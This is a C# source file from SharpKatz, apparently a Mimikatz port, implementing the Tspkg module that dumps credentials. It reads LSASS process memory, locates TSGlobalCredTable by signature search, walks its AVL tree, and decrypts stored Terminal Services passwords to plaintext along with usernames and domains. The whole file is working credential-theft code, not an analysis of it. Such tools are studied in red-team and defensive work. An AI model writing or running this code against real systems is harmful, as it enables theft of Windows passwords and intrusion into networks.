﻿using SharpKatz.Credential;
using SharpKatz.Crypto;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using static SharpKatz.Module.Msv1;
using static SharpKatz.Natives;

namespace SharpKatz.Module
{
    class Tspkg
    {

        static long max_search_size = 170000;

        [StructLayout(LayoutKind.Sequential)]
        public struct RTL_AVL_TABLE
        {
            public RTL_BALANCED_LINKS BalancedRoot;
            public IntPtr OrderedPointer;
            public uint WhichOrderedElement;
            public uint NumberGenericTableElements;
            public uint DepthOfTree;
            public IntPtr RestartKey;//PRTL_BALANCED_LINKS
            public uint DeleteCount;
            public IntPtr CompareRoutine; //
            public IntPtr AllocateRoutine; //
            public IntPtr FreeRoutine; //
            public IntPtr TableContext;
        };

        [StructLayout(LayoutKind.Sequential)]
        public unsafe struct RTL_BALANCED_LINKS
        {
            public IntPtr Parent;//RTL_BALANCED_LINKS
            public IntPtr LeftChild;//RTL_BALANCED_LINKS
            public IntPtr RightChild;//RTL_BALANCED_LINKS
            public byte Balance;
            public fixed byte Reserved[3]; // align
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_TS_PRIMARY_CREDENTIAL
        {
            IntPtr unk0; // lock ?
            public KIWI_GENERIC_PRIMARY_CREDENTIAL credentials;
        }

        [StructLayout(LayoutKind.Sequential)]
        public unsafe struct KIWI_TS_CREDENTIAL
        {

            public fixed byte unk0[108];

            LUID LocallyUniqueIdentifier;
            IntPtr unk1;
            IntPtr unk2;
            IntPtr pTsPrimary;//PKIWI_TS_PRIMARY_CREDENTIAL
        }

        [StructLayout(LayoutKind.Sequential)]
        public unsafe struct KIWI_TS_CREDENTIAL_1607
        {
            public fixed byte unk0[112];
            LUID LocallyUniqueIdentifier;
            IntPtr unk1;
            IntPtr unk2;
            IntPtr pTsPrimary; //PKIWI_TS_PRIMARY_CREDENTIAL
        }

        public static unsafe int FindCredentials(IntPtr hLsass, IntPtr tspkgMem, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
        {
            RTL_AVL_TABLE entry;
            long tsGlobalCredTableSignOffset, tsGlobalCredTableOffset;
            IntPtr tsGlobalCredTableAddr;
            IntPtr tspkgLocal;
            IntPtr llCurrent;
            /*
            // Load wdigest.dll locally to avoid multiple ReadProcessMemory calls into lsass
            tspkgLocal = Natives.LoadLibrary("tspkg.dll");
            if (tspkgLocal == IntPtr.Zero)
            {
                Console.WriteLine("[x] Tspkg Error: Could not load tspkg.dll into local process");
                return 1;
            }
            //Console.WriteLine("[*] Tspkg  Loaded tspkg.dll at address {0:X}", tspkgLocal.ToInt64());

            byte[] tmpbytes = new byte[max_search_size];
            Marshal.Copy(tspkgLocal, tmpbytes, 0, (int)max_search_size);

            // Search for SspCredentialList signature within tspkg.dll and grab the offset
            tsGlobalCredTableSignOffset = (long)Utility.SearchPattern(tmpbytes, oshelper.TSGlobalCredTableSign);
            if (tsGlobalCredTableSignOffset == 0)
            {
                Console.WriteLine("[x] Tspkg  Error: Could not find TSGlobalCredTable signature\n");
                return 1;
            }
            //Console.WriteLine("[*] Tspkg  TSGlobalCredTable offset found as {0}", tsGlobalCredTableSignOffset);

            // Read memory offset to TSGlobalCredTable from a "LEA RCX,[TSGlobalCredTable]"  asm
            IntPtr tmp_p = IntPtr.Add(tspkgMem, (int)tsGlobalCredTableSignOffset + oshelper.TSGlobalCredTableOffset);
            byte[] tsGlobalCredTableOffsetBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 4);
            tsGlobalCredTableOffset = BitConverter.ToInt32(tsGlobalCredTableOffsetBytes, 0);

            // Read pointer at address to get the true memory location of TSGlobalCredTable
            tmp_p = IntPtr.Add(tspkgMem, (int)tsGlobalCredTableSignOffset + oshelper.TSGlobalCredTableOffset + sizeof(int) + (int)tsGlobalCredTableOffset);
            byte[] tsGlobalCredTableAddrBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 8);
            tsGlobalCredTableAddr = new IntPtr(BitConverter.ToInt64(tsGlobalCredTableAddrBytes, 0));
            */
            tsGlobalCredTableAddr = Utility.GetListAdress(hLsass, tspkgMem, "tspkg.dll", max_search_size, oshelper.TSGlobalCredTableOffset, oshelper.TSGlobalCredTableSign);

            //Console.WriteLine("[*] Tspkg TSGlobalCredTable found at address {0:X}", tsGlobalCredTableAddr.ToInt64());

            if (tsGlobalCredTableAddr != IntPtr.Zero)
            {
                // Read first entry from linked list
                byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, tsGlobalCredTableAddr, Convert.ToUInt64(sizeof(RTL_AVL_TABLE)));
                entry = Utility.ReadStruct<RTL_AVL_TABLE>(entryBytes);

                llCurrent = entry.BalancedRoot.RightChild;

                WalkAVLTables(ref hLsass, tsGlobalCredTableAddr, oshelper, iv, aeskey, deskey, logonlist);

                return 0;
            }
            else
            {
                return 1;
            }
        }

        private static unsafe void WalkAVLTables(ref IntPtr hLsass, IntPtr pElement, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
        {
            
            if (pElement == null)
                return;

            byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, pElement, Convert.ToUInt64(sizeof(RTL_AVL_TABLE)));
            RTL_AVL_TABLE entry = Utility.ReadStruct<RTL_AVL_TABLE>(entryBytes);

            if (entry.OrderedPointer != IntPtr.Zero)
            {
                byte[] krbrLogonSessionBytes = Utility.ReadFromLsass(ref hLsass, entry.OrderedPointer, Convert.ToUInt64(Marshal.SizeOf(oshelper.TSCredType)));

                LUID luid = Utility.ReadStruct<LUID>(Utility.GetBytes(krbrLogonSessionBytes, oshelper.TSCredLocallyUniqueIdentifierOffset, sizeof(LUID)));
                long pCredAddr = BitConverter.ToInt64(krbrLogonSessionBytes, oshelper.TSCredOffset);

                byte[] pCredBytes = Utility.ReadFromLsass(ref hLsass, new IntPtr(pCredAddr), Convert.ToUInt64(sizeof(KIWI_TS_PRIMARY_CREDENTIAL)));
                KIWI_TS_PRIMARY_CREDENTIAL pCred = Utility.ReadStruct<KIWI_TS_PRIMARY_CREDENTIAL>(pCredBytes);

                Natives.UNICODE_STRING usUserName = pCred.credentials.UserName;
                Natives.UNICODE_STRING usDomain = pCred.credentials.Domaine;
                Natives.UNICODE_STRING usPassword = pCred.credentials.Password;

                string username = Utility.ExtractUnicodeStringString(hLsass, usUserName);
                string domain = Utility.ExtractUnicodeStringString(hLsass, usDomain);
                
                byte[] msvPasswordBytes = Utility.ReadFromLsass(ref hLsass, usPassword.Buffer, (ulong)usPassword.MaximumLength);

                byte[] msvDecryptedPasswordBytes = BCrypt.DecryptCredentials(msvPasswordBytes, iv, aeskey, deskey);

                string passDecrypted = "";
                UnicodeEncoding encoder = new UnicodeEncoding(false, false, true);
                try
                {
                    passDecrypted = encoder.GetString(msvDecryptedPasswordBytes);
                }
                catch (Exception)
                {
                    passDecrypted = Utility.PrintHexBytes(msvDecryptedPasswordBytes);
                }

                if (!string.IsNullOrEmpty(username) && username.Length > 1)
                {

                    Credential.Tspkg krbrentry = new Credential.Tspkg();

                    if (!string.IsNullOrEmpty(username))
                    {
                        krbrentry.UserName = username;
                    }
                    else
                    {
                        krbrentry.UserName = "[NULL]";
                    }

                    if (!string.IsNullOrEmpty(domain))
                    {
                        krbrentry.DomainName = domain;
                    }
                    else
                    {
                        krbrentry.DomainName = "[NULL]";
                    }

                    // Check if password is present
                    if (!string.IsNullOrEmpty(passDecrypted))
                    {
                        krbrentry.Password = passDecrypted;

                    }
                    else
                    {
                        krbrentry.Password = "[NULL]";
                    }

                    Logon currentlogon = logonlist.FirstOrDefault(x => x.LogonId.HighPart == luid.HighPart && x.LogonId.LowPart == luid.LowPart);
                    if (currentlogon == null)
                    {
                        currentlogon = new Logon(luid);
                        currentlogon.UserName = username;

                        currentlogon.Tspkg = krbrentry;
                        logonlist.Add(currentlogon);
                    }
                    else
                    {
                        currentlogon.Tspkg = krbrentry;
                    }
                }
            }

            if (entry.BalancedRoot.RightChild != IntPtr.Zero)
                WalkAVLTables(ref hLsass, entry.BalancedRoot.RightChild, oshelper, iv, aeskey, deskey, logonlist);
            if (entry.BalancedRoot.LeftChild != IntPtr.Zero)
                WalkAVLTables(ref hLsass, entry.BalancedRoot.LeftChild, oshelper, iv, aeskey, deskey, logonlist);

        }
    }
}